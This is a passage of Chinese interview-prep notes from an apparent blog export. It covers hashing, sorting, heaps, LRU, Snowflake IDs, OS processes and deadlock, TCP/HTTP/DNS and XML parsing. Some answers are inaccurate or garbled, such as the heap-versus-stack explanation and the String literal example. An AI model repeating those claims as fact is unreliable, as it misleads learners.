是哈希表在其容量自动增加之前可以达到多满的一种尺度。当哈希表中的条目数超出了加载因子与当前容量的乘积时，则要对该哈希表进行 rehash 操作（即重建内部数据结构），从而哈希表将具有大约两倍的桶数。通常，默认加载因子是 0.75, 这是在时间和空间成本上寻求一种折衷。加载因子过高虽然减少了空间开销，但同时也增加了查询成本（在大多数 HashMap 类的操作中，包括 get 和 put 操作，都反映了这一点）。在设置初始容量时应该考虑到映射中所需的条目数及其加载因子，以便最大限度地减少 rehash 操作次数。如果初始容量大于最大条目数除以加载因子，则不会发生 rehash 操作。 hashmap共有4个构造函数： // 默认构造函数。HashMap() // 指定“容量大小”的构造函数 HashMap(int capacity) // 指定“容量大小”和“加载因子”的构造函数 HashMap(int capacity, float loadFactor) // 包含“子Map”的构造函数 HashMap(Map&lt;? extends K, ? extends V&gt; map) 如何构造一致性 哈希算法。先构造一个长度为232的整数环（这个环被称为一致性Hash环），根据节点名称的Hash值（其分布为[0, 232-1]）将服务器节点放置在这个Hash环上，然后根据数据的Key值计算得到其Hash值（其分布也为[0, 232-1]），接着在Hash环上顺时针查找距离这个Key值的Hash值最近的服务器节点，完成Key到服务器的映射查找。 这种算法解决了普通余数Hash算法伸缩性差的问题，可以保证在上线、下线服务器的情况下尽量有多的请求命中原来路由到的服务器。 Object作为HashMap的key的话，对Object有什么要求吗？ 要求Object中hashcode不能变。 hashset 存的数是有序的吗？ Hashset是无序的。 树TreeMap和TreeSet在排序时如何比较元素？Collections工具类中的sort()方法如何比较元素？TreeSet要求存放的对象所属的类必须实现Comparable接口，该接口提供了比较元素的compareTo()方法，当插入元素时会回调该方法比较元素的大小。TreeMap要求存放的键值对映射的键必须实现Comparable接口从而根据键对元素进行排序。Collections工具类的sort方法有两种重载的形式，第一种要求传入的待排序容器中存放的对象比较实现Comparable接口以实现元素的比较；第二种不强制性的要求容器中的元素必须可比较，但是要求传入第二个参数，参数是Comparator接口的子类型（需要重写compare方法实现元素的比较），相当于一个临时定义的排序规则，其实就是通过接口注入比较元素大小的算法，也是对回调模式的应用（Java中对函数式编程的支持）。 如何知道二叉树的深度？实现二叉树的深度方式有两种，递归以及非递归。 ①递归实现： 为了求树的深度，可以先求其左子树的深度和右子树的深度，可以用递归实现，递归的出口就是节点为空。返回值为0； ②非递归实现： 利用层次遍历的算法，设置变量level记录当前节点所在的层数，设置变量last指向当前层的最后一个节点，当处理完当前层的最后一个节点，让level指向+1操作。设置变量cur记录当前层已经访问的节点的个数，当cur等于last时，表示该层访问结束。 层次遍历在求树的宽度、输出某一层节点，某一层节点个数，每一层节点个数都可以采取类似的算法。 树的宽度：在树的深度算法基础上，加一个记录访问过的层节点个数最多的变量max,在访问每层前max与last比较，如果max比较大，max不变，如果max小于last，把last赋值给max; B+树和B-树？b+树的中间节点不保存数据，所以磁盘页能容纳更多节点元素，更“矮胖”； b+树查询必须查找到叶子节点，b树只要匹配到即可不用管元素位置，因此b+树查找更稳定（并不慢）； 对于范围查找来说，b+树只需遍历叶子节点链表即可，b树却需要重复地中序遍历。 遍历链表数组排序排序都有哪几种方法？请列举出来。 排序的方法有：插入排序（直接插入排序、希尔排序），交换排序（冒泡排序、快速排序），选择排序（直接选择排序、堆排序），归并排序，分配排序（箱排序、基数排序）快速排序的伪代码。/ /使用快速排序方法对a[ 0 :n- 1 ]排序从a[ 0 :n- 1 ]中选择一个元素作为m i d d l e，该元素为支点把余下的元素分割为两段left 和r i g h t，使得l e f t中的元素都小于等于支点，而right 中的元素都大于等于支点递归地使用快速排序方法对left 进行排序递归地使用快速排序方法对right 进行排序所得结果为l e f t + m i d d l e + r i g h t 归并排序的原理是什么？（1）归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。 （2）首先考虑下如何将将二个有序数列合并。这个非常简单，只要从比较二个数列的第一个数，谁小就先取谁，取了后就在对应数列中删除这个数。然后再进行比较，如果有数列为空，那直接将另一个数列的数据依次取出即可。 （3）解决了上面的合并有序数列问题，再来看归并排序，其的基本思路就是将数组分成二组A，B，如果这二组组内的数据都是有序的，那么就可以很方便的将这二组数据进行排序。如何让这二组组内数据有序了？ 可以将A，B组各自再分成二组。依次类推，当分出来的小组只有一个数据时，可以认为这个小组组内已经达到了有序，然后再合并相邻的二个小组就可以了。这样通过先递归的分解数列，再合并数列就完成了归并排序。 堆排序的原理是什么？堆排序就是把最大堆堆顶的最大数取出，将剩余的堆继续调整为最大堆，再次将堆顶的最大数取出，这个过程持续到剩余数只有一个时结束。在堆中定义以下几种操作： （1）最大堆调整（Max-Heapify）：将堆的末端子节点作调整，使得子节点永远小于父节点。 （2）创建最大堆（Build-Max-Heap）：将堆所有数据重新排序，使其成为最大堆。 （3）堆排序（Heap-Sort）：移除位在第一个数据的根节点，并做最大堆调整的递归运算 如何得到一个数据流中的中位数？数据是从一个数据流中读出来的，数据的数目随着时间的变化而增加。如果用一个数据容器来保存从流中读出来的数据，当有新的数据流中读出来时，这些数据就插入到数据容器中。 数组是最简单的容器。如果数组没有排序，可以用 Partition 函数找出数组中的中位数。在没有排序的数组中插入一个数字和找出中位数的时间复杂度是 O(1)和 O(n)。 我们还可以往数组里插入新数据时让数组保持排序，这是由于可能要移动 O(n)个数，因此需要 O(n)时间才能完成插入操作。在已经排好序的数组中找出中位数是一个简单的操作，只需要 O(1)时间即可完成。 排序的链表时另外一个选择。我们需要 O(n)时间才能在链表中找到合适的位置插入新的数据。如果定义两个指针指向链表的中间结点（如果链表的结点数目是奇数，那么这两个指针指向同一个结点），那么可以在 O（1）时间得出中位数。此时时间效率与及基于排序的数组的时间效率一样。 如果能够保证数据容器左边的数据都小于右边的数据，这样即使左、右两边内部的数据没有排序，也可以根据左边最大的数及右边最小的数得到中位数。如何快速从一个容器中找出最大数？用最大堆实现这个数据容器，因为位于堆顶的就是最大的数据。同样，也可以快速从最小堆中找出最小数。 因此可以用如下思路来解决这个问题：用一个最大堆实现左边的数据容器，用最小堆实现右边的数据容器。往堆中插入一个数据的时间效率是 O(logn)。由于只需 O(1)时间就可以得到位于堆顶的数据，因此得到中位数的时间效率是 O(1)。 你知道哪些排序算法，这些算法的时间复杂度分别是多少，解释一下快排？ 快排：快速排序有两个方向，左边的i下标一直往右走（当条件a[i] &lt;= a[center_index]时），其中center_index是中枢元素的数组下标，一般取为数组第0个元素。 而右边的j下标一直往左走（当a[j] &gt; a[center_index]时）。 如果i和j都走不动了，i &lt;= j, 交换a[i]和a[j],重复上面的过程，直到i&gt;j。交换a[j]和a[center_index]，完成一趟快速排序。 堆与栈解释一下，内存中的栈(stack)、堆(heap) 和静态区(static area) 的用法。通常我们定义一个基本数据类型的变量，一个对象的引用，还有就是函数调用的现场保存都使用内存中的栈空间；而通过new关键字和构造器创建的对象放在堆空间；程序中的字面量（literal）如直接书写的100、”hello”和常量都是放在静态区中。栈空间操作起来最快但是栈很小，通常大量的对象都是放在堆空间，理论上整个内存没有被其他进程使用的空间甚至硬盘上的虚拟内存都可以被当成堆空间来使用。String str = new String(“hello”);上面的语句中变量str放在栈上，用new创建出来的字符串对象放在堆上，而”hello”这个字面量放在静态区。 heap和stack有什么区别。栈是一种线形集合，其添加和删除元素的操作应在同一段完成。栈按照后进先出的方式进行处理。堆是栈的一个组成元素。 堆与栈的不同是什么？（1）Java的堆是一个运行时数据区，类的对象从中分配空间。通过比如：new等指令建立，不需要代码显式的释放，由垃圾回收来负责。 优点：可以动态地分配内存大小，垃圾收集器会自动回收垃圾数据。 缺点：由于其优点，所以存取速度较慢。 （2）栈： 其数据项的插入和删除都只能在称为栈顶的一端完成，后进先出。栈中存放一些基本类型的 变量 和 对象句柄。 优点：读取数度比堆要快，仅次于寄存器，栈数据可以共享。 缺点：比堆缺乏灵活性，存在栈中的数据大小与生存期必须是确定的。 举例： String是一个特殊的包装类数据。可以用：String str = new String(“csdn”);String str = “csdn”; 两种的形式来创建，第一种是用new()来新建对象的，它会在存放于堆中。每调用一次就会创建一个新的对象。而第二种是先在栈中创建一个对String类的对象引用变量str，然后查找栈中有没有存放”csdn”，如果没有，则将”csdn”存放进栈，并令str指向”abc”，如果已经有”csdn” 则直接令str指向“csdn”。 队列什么是Java优先级队列(Priority Queue)？PriorityQueue是一个基于优先级堆的无界队列，它的元素是按照自然顺序(natural order)排序的。在创建的时候，我们可以给它提供一个负责给元素排序的比较器。PriorityQueue不允许null值，因为他们没有自然顺序，或者说他们没有任何的相关联的比较器。最后，PriorityQueue不是线程安全的，入队和出队的时间复杂度是O(log(n))。 高级算法LRU算法的实现原理？①LRU（Least recently used，最近最少使用）算法根据数据的历史访问记录来进行淘汰数据，其核心思想是“如果数据最近被访问过，那么将来被访问的几率也很高”，反过来说“如果数据最近这段时间一直都没有访问,那么将来被访问的概率也会很低”，两种理解是一样的；常用于页面置换算法，为虚拟页式存储管理服务。 ②达到这样一种情形的算法是最理想的：每次调换出的页面是所有内存页面中最迟将被使用的；这可以最大限度的推迟页面调换，这种算法，被称为理想页面置换算法。可惜的是，这种算法是无法实现的。为了尽量减少与理想算法的差距，产生了各种精妙的算法，最近最少使用页面置换算法便是其中一个。LRU 算法的提出，是基于这样一个事实：在前面几条指令中使用频繁的页面很可能在后面的几条指令中频繁使用。反过来说，已经很久没有使用的页面很可能在未来较长的一段时间内不会被用到 。这个，就是著名的局部性原理——比内存速度还要快的cache，也是基于同样的原理运行的。因此，我们只需要在每次调换时，找到最近最少使用的那个页面调出内存。 算法实现的关键 命中率：当存在热点数据时，LRU的效率很好，但偶发性的、周期性的批量操作会导致 LRU 命中率急剧下降，缓存污染情况比较严重。复杂度：实现起来较为简单。存储成本：几乎没有空间上浪费。代价：命中时需要遍历链表，找到命中的数据块索引，然后需要将数据移到头部。 为什么要设计 后缀表达式，有什么好处？后缀表达式又叫逆波兰表达式，逆波兰记法不需要括号来标识操作符的优先级。 设计一个算法，用来压缩一段URL？该算法主要使用MD5 算法对原始链接进行加密（这里使用的MD5 加密后的字符串长度为32 位），然后对加密后的字符串进行处理以得到短链接的地址。 谈一谈，id全局唯一且自增，如何实现？SnowFlake雪花算法 雪花ID生成的是一个64位的二进制正整数，然后转换成10进制的数。64位二进制数由如下部分组成： snowflake id生成规则 1位标识符：始终是0，由于long基本类型在Java中是带符号的，最高位是符号位，正数是0，负数是1，所以id一般是正数，最高位是0。 41位时间戳：41位时间截不是存储当前时间的时间截，而是存储时间截的差值（当前时间截 - 开始时间截 )得到的值，这里的的开始时间截，一般是我们的id生成器开始使用的时间，由我们程序来指定的。 10位机器标识码：可以部署在1024个节点，如果机器分机房（IDC）部署，这10位可以由 5位机房ID + 5位机器ID 组成。 12位序列：毫秒内的计数，12位的计数顺序号支持每个节点每毫秒(同一机器，同一时间截)产生4096个ID序号 优点 简单高效，生成速度快。 时间戳在高位，自增序列在低位，整个ID是趋势递增的，按照时间有序递增。 灵活度高，可以根据业务需求，调整bit位的划分，满足不同的需求。 缺点 依赖机器的时钟，如果服务器时钟回拨，会导致重复ID生成。 在分布式环境上，每个服务器的时钟不可能完全同步，有时会出现不是全局递增的情况。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"introduction to operating system","slug":"操作系统概论","date":"2020-07-23T22:46:46.000Z","updated":"2021-04-11T17:11:28.903Z","comments":true,"path":"introduction-to-operating-system/","link":"","permalink":"https://kayleh.top/introduction-to-operating-system/","excerpt":"操作系统概论","text":"操作系统概论 64位和32位的区别？操作系统只是硬件和应用软件中间的一个平台。32位操作系统针对的32位的CPU设计。64位操作系统针对的64位的CPU设计。 CentOS 和 Linux的关系？CentOS是Linux众多得发行版本之一，linux有三大发行版本（：Slackware、debian、redhat）,而Redhat有收费的商业版和免费的开源版,商业版的业内称之为RHEL系列，CentOS是来自于依照开放源代码规定而公布的源代码重新编译而成。可以用CentOS替代商业版的RHEL使用。两者的不同，CentOS不包含封闭源代码软件，是免费的。 进程的描述与控制LINUX下的线程，GDI类LINUX实现的就是基于核心轻量级进程的”一对一”线程模型，一个线程实体对应一个核心轻量级进程，而线程之间的管理在核外函数库中实现。 GDI类为图像设备编程接口类库。 进程和线程的区别是什么？进程是执行着的应用程序，而线程是进程内部的一个执行序列。一个进程可以有多个线程。线程又叫做轻量级进程。 系统线程数量上限是多少？Linux 系统中单个进程的最大线程数有其最大的限制 PTHREAD_THREADS_MAX。 这个限制可以在/usr/include/bits/local_lim.h中查看 ，对 linuxthreads 这个值一般是 1024，对于 nptl 则没有硬性的限制，仅仅受限于系统的资源。 这个系统的资源主要就是线程的 stack 所占用的内存，用 ulimit -s 可以查看默认的线程栈大小，一般情况下，这个值是8M=8192KB。 线程与进程的区别进程和线程的主要差别在于它们是不同的操作系统资源管理方式。进程有独立的地址空间，一个进程崩溃后，在保护模式下不会对其它进程产生影响，而线程只是一个进程中的不同执行路径。线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间，一个线程死掉就等于整个进程死掉，所以多进程的程序要比多线程的程序健壮，但在进程切换时，耗费资源较大，效率要差一些。但对于一些要求同时进行并且又要共享某些变量的并发操作，只能用线程，不能用进程。 1) 简而言之,一个程序至少有一个进程,一个进程至少有一个线程. 2) 线程的划分尺度小于进程，使得多线程程序的并发性高。 3) 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。 4) 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。 5) 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。 如何杀死一个进程？Kill pid 输入输出系统请介绍一下，socket编程的三种通信模型，BIO，NIO，AIO阻塞，非阻塞，io多路复用，epoll支持文件符数目没有限制，fd集合只会从用户进程拷贝到内核一次，自己维护一个事件队列，不用每次遍历fd集合发现是否有就绪状态。 存储器管理怎么理解操作系统里的内存碎片，有什么解决办法？内存碎片分为：内部碎片和外部碎片。 内部碎片就是已经被分配出去（能明确指出属于哪个进程）却不能被利用的内存空间； 内部碎片是处于区域内部或页面内部的存储块。占有这些区域或页面的进程并不使用这个存储块。而在进程占有这块存储块时，系统无法利用它。直到进程释放它，或进程结束时，系统才有可能利用这个存储块。 单道连续分配只有内部碎片。多道固定连续分配既有内部碎片，又有外部碎片。 外部碎片指的是还没有被分配出去（不属于任何进程），但由于太小了无法分配给申请内存空间的新进程的内存空闲区域。 外部碎片是出于任何已分配区域或页面外部的空闲存储块。这些存储块的总和可以满足当前申请的长度要求，但是由于它们的地址不连续或其他原因，使得系统无法满足当前申请。 使用伙伴系统算法。 什么是页式存储？主存被等分成大小相等的片，称为主存块，又称为实页。 当一个用户程序装入内存时，以页面为单位进行分配。页面的大小是为2n ,通常为1KB、2KB、2n KB等 处理调度与死锁系统如何提高并发性？1、提高CPU并发计算能力 （1）多进程&amp;多线程 （2）减少进程切换，使用线程，考虑进程绑定CPU （3）减少使用不必要的锁，考虑无锁编程 （4）考虑进程优先级 （5）关注系统负载 2、改进I/O模型 (1)DMA技术 (2)异步I/O (3)改进多路I/O就绪通知策略，epoll (4)Sendfile (5)内存映射 (6)直接I/O 通常系统CPU比较高是什么原因？1、首先查看是哪些进程的CPU占用率最高（如下可以看到详细的路径） ps -aux —sort -pcpu | more # 定位有问题的线程可以用如下命令 ps -mp pid -o THREAD,tid,time | more 2、查看JAVA进程的每个线程的CPU占用率 ps -Lp 5798 cu | more # 5798是查出来进程PID 3、追踪线程，查看负载过高的原因，使用JDK下的一个工具 jstack 5798 # 5798是PID jstack -J-d64 -m 5798 # -j-d64指定64为系统 jstack 查出来的线程ID是16进制，可以把输出追加到文件，导出用记事本打开，再根据系统中的线程ID去搜索查看该ID的线程运行内容，可以和开发一起排查。 什么情况下会发生死锁？解决死锁的策略有哪些？（一）互斥条件：一个资源一次只能被一个进程访问。即某个资源在一段时间内只能由一个进程占有，不能同时被两个或两个以上的进程占 有。这种独占资源如CD-ROM驱动器，打印机等等，必须在占有该资源的进程主动释放它之后，其它进程才能占有该资源。这是由资源本身的属性所决定的。 （二）请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。进程至少已经占有一个资源，但又申请新的资源；由于该资源已被另外进程占有，此时该进程阻塞；但是，它在等待新资源之时，仍继续占用已占有的资源。 （三）不剥夺条件：进程已经获得的资源，在未使用完之前不能强行剥夺，而只能由该资源的占有者进程自行释放。 （四）循环等待条件：若干资源形成一种头尾相接的循环等待资源关系。 解决方法：银行家算法","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"计算机网络","slug":"计算机网络","date":"2020-07-23T22:30:23.000Z","updated":"2021-04-11T17:11:29.036Z","comments":true,"path":"computer-network/","link":"","permalink":"https://kayleh.top/computer-network/","excerpt":"计算机网络","text":"计算机网络 TCP协议、IP协议、HTTP协议分别在哪一层吗？运输层，网络层，应用层。 网络七层模型： 物理层，数据链路层，网络层，运输层，会话层，表现层，应用层 网络五层模型： 物理层，数据链路层，网络层，运输层，应用层 运输层TCP协议的4次握手。由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。 TCP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在socket编程中，任何一方执行close()操作即可产生挥手操作。 （1）客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。 （2）服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 （3）服务器B关闭与客户端A的连接，发送一个FIN给客户端A。 （4）客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。 为什么tcp为什么要建立连接？保证可靠传输。 解释一下TCP为什么可靠一些 三次握手，超时重传，滑动窗口，拥塞控制。 说明一下哪种应用场景会使用TCP协议，使用它的意义 当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议 简单描述一下，TCP的连接和释放过程。三次握手的过程1）主机A向主机B发送TCP连接请求数据包，其中包含主机A的初始序列号seq(A)=x。（其中报文中同步标志位SYN=1，ACK=0，表示这是一个TCP连接请求数据报文；序号seq=x，表明传输数据时的第一个数据字节的序号是x）； 2）主机B收到请求后，会发回连接确认数据包。（其中确认报文段中，标识位SYN=1，ACK=1，表示这是一个TCP连接响应数据报文，并含主机B的初始序列号seq(B)=y，以及主机B对主机A初始序列号的确认号ack(B)=seq(A)+1=x+1） 3）第三次，主机A收到主机B的确认报文后，还需作出确认，即发送一个序列号seq(A)=x+1；确认号为ack(A)=y+1的报文； 四次挥手过程假设主机A为客户端，主机B为服务器，其释放TCP连接的过程如下：1） 关闭客户端到服务器的连接：首先客户端A发送一个FIN，用来关闭客户到服务器的数据传送，然后等待服务器的确认。其中终止标志位FIN=1，序列号seq=u。2） 服务器收到这个FIN，它发回一个ACK，确认号ack为收到的序号加1。3） 关闭服务器到客户端的连接：也是发送一个FIN给客户端。 4） 客户段收到FIN后，并发回一个ACK报文确认，并将确认序号seq设置为收到序号加1。 首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。 三次握手 四次挥手 http请求中的304状态码的含义304(未修改)自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。如果网页自请求者上次请求后再也没有更改过，您应将服务器配置为返回此响应(称为 If-Modified-Since HTTP 标头)。服务器可以告诉 Googlebot 自从上次抓取后网页没有变更，进而节省带宽和开销。 说明一下，SSL四次握手的过程1、 客户端发出请求 首先，客户端（通常是浏览器）先向服务器发出加密通信的请求，这被叫做ClientHello请求。 2、服务器回应 服务器收到客户端请求后，向客户端发出回应，这叫做SeverHello。 3、客户端回应 客户端收到服务器回应以后，首先验证服务器证书。如果证书不是可信机构颁布、或者证书中的域名与实际域名不一致、或者证书已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。 4、服务器的最后回应 服务器收到客户端的第三个随机数pre-master key之后，计算生成本次会话所用的”会话密钥”。然后，向客户端最后发送下面信息。 （1）编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。 （2）服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。 至此，整个握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的HTTP协议，只不过用”会话密钥”加密内容。 请你讲讲http1.1和1.0的区别主要区别主要体现在： 缓存处理，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。 带宽优化及网络连接的使用，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。 错误通知的管理，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。 Host头处理，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。 长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。 请谈一下，你知道的http请求，并说明应答码502和504的区别OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。 HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 GET：向特定的资源发出请求。 POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 PUT：向指定资源位置上传其最新内容。 DELETE：请求服务器删除Request-URI所标识的资源。 TRACE：回显服务器收到的请求，主要用于测试或诊断。 CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 虽然HTTP的请求方式有8种，但是我们在实际应用中常用的也就是get和post，其他请求方式也都可以通过这两种方式间接的来实现。 502：作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。 504：作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。 http和https的区别 https协议要申请证书到ca，需要一定经济成本；2） http是明文传输，https是加密的安全传输；3） 连接的端口不一样，http是80，https是443；4）http连接很简单，没有状态；https是ssl加密的传输，身份认证的网络协议，相对http传输比较安全。 请讲一下浏览器从接收到一个URL，到最后展示出页面，经历了哪些过程。1.DNS解析 2.TCP连接 3.发送HTTP请求 4.服务器处理请求并返回HTTP报文 5.浏览器解析渲染页面 网络层请简单解释一下，arp协议和arp攻击。地址解析协议。ARP攻击的第一步就是ARP欺骗。由上述“ARP协议的工作过程”我们知道，ARP协议基本没有对网络的安全性做任何思考，当时人们考虑的重点是如何保证网络通信能够正确和快速的完成——ARP协议工作的前提是默认了其所在的网络是一个善良的网络，每台主机在向网络中发送应答信号时都是使用的真实身份。不过后来，人们发现ARP应答中的IP地址和MAC地址中的信息是可以伪造的，并不一定是自己的真实IP地址和MAC地址，由此，ARP欺骗就产生了。 什么是icmp协议，它的作用是什么？它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。 请你讲一下路由器和交换机的区别？交换机用于同一网络内部数据的快速传输转发决策通过查看二层头部完成转发不需要修改数据帧工作在 TCP/IP 协议的二层 —— 数据链路层工作简单，直接使用硬件处理路由器用于不同网络间数据的跨网络传输转发决策通过查看三层头部完成转发需要修改 TTL ，IP 头部校验和需要重新计算，数据帧需要重新封装工作在 TCP/IP 协议的三层 —— 网络层工作复杂，使用软件处理。 请你谈谈DNS的寻址过程。1、在浏览器中输入www.qq.com域名，操作系统会先检查自己本地的hosts文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。 2、如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。 3、如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP/ip参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。 4、如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。 5、如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询，如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找qq.com域服务器，重复上面的动作，进行查询，直至找到www.qq.com主机。 6、如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。 从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询。 请你简单讲解一下，负载均衡 反向代理模式的优点、缺点（1）反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。 （2）反向代理负载均衡技术是把将来自internet上的连接请求以反向代理的方式动态地转发给内部网络上的多台服务器进行处理，从而达到负载均衡的目的。 （3）反向代理负载均衡能以软件方式来实现，如apache mod_proxy、netscape proxy等，也可以在高速缓存器、负载均衡器等硬件设备上实现。反向代理负载均衡可以将优化的负载均衡策略和代理服务器的高速缓存技术结合在一起，提升静态网页的访问速度，提供有益的性能；由于网络外部用户不能直接访问真实的服务器，具备额外的安全性（同理，NAT负载均衡技术也有此优点）。 （4）其缺点主要表现在以下两个方面 反向代理是处于OSI参考模型第七层应用的，所以就必须为每一种应用服务专门开发一个反向代理服务器，这样就限制了反向代理负载均衡技术的应用范围，现在一般都用于对web服务器的负载均衡。 针对每一次代理，代理服务器就必须打开两个连接，一个对外，一个对内，因此在并发连接请求数量非常大的时候，代理服务器的负载也就非常大了，在最后代理服务器本身会成为服务的瓶颈。 一般来讲，可以用它来对连接数量不是特别大，但每次连接都需要消耗大量处理资源的站点进行负载均衡，如search等。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"XML","slug":"XML","date":"2020-07-23T22:24:49.000Z","updated":"2021-04-11T17:11:28.473Z","comments":true,"path":"xml/","link":"","permalink":"https://kayleh.top/xml/","excerpt":"XML","text":"XML 请介绍一下，XML文档定义的几种形式，它们之间有何本质区别？再说说，解析XML文档又有哪几种方式？a: 两种形式 dtd schemab: 本质区别:schema本身是xml的，可以被XML解析器解析(这也是从DTD上发展schema的根本目的)c:有DOM,SAX,STAX等DOM:处理大型文件时其性能下降的非常厉害。这个问题是由DOM的树结构所造成的，这种结构占用的内存较多，而且DOM必须在解析文件之前把整个文档装入内存,适合对XML的随机访问SAX:不现于DOM,SAX是事件驱动型的XML解析方式。它顺序读取XML文件，不需要一次全部装载整个文件。当遇到像文件开头，文档结束，或者标签开头与标签结束时，它会触发一个事件，用户通过在其回调事件中写入处理代码来处理XML文件，适合对XML的顺序访问STAX:Streaming API for XML (StAX)xml文档有两种定义方法：dtd：数据类型定义（data type definition），用以描述XML文档的文档结构，是早期的XML文档定义形式。schema：其本身是基于XML语言编写的，在类型和语法上的限定能力比dtd强，处理也比较方便，因为此正逐渐代替dtd成为新的模式定义语言。 谈一谈，Java规范中和 与Web Service相关的 规范有哪些？Java规范中和Web Service相关的有三个：- JAX-WS(JSR 224)：这个规范是早期的基于SOAP的Web Service规范JAX-RPC的替代版本，它并不提供向下兼容性，因为RPC样式的WSDL以及相关的API已经在Java EE5中被移除了。WS-MetaData是JAX-WS的依赖规范，提供了基于注解配置Web Service和SOAP消息的相关API。- JAXM(JSR 67)：定义了发送和接收消息所需的API,相当于Web Service的服务器端。- JAX-RS(JSR 311 &amp; JSR 339 &amp; JSR 370)：是Java针对REST（Representation State Transfer）架构风格制定的一套Web Service规范。REST是一种软件架构模式，是一种风格，它不像SOAP那样本身承载着一种消息协议， (两种风格的Web 